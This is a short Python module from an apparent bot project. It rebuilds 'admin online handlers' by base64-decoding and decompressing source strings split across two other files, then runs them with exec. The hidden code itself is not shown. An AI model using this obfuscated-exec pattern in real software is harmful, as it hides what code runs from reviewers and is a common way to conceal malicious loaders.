"""Admin online handlers (assembled)."""
import base64, zlib, types
from src.bot.handlers.admin_online_c0 import P0
from src.bot.handlers.admin_online_c1 import P1
_SRC = zlib.decompress(base64.b64decode(P0 + P1)).decode()
_mod = types.ModuleType(__name__)
_mod.__file__ = __file__
exec(compile(_SRC, __file__, "exec"), _mod.__dict__)
router = _mod.router
for _k, _v in list(_mod.__dict__.items()):
    if not _k.startswith("_"):
        globals()[_k] = _v
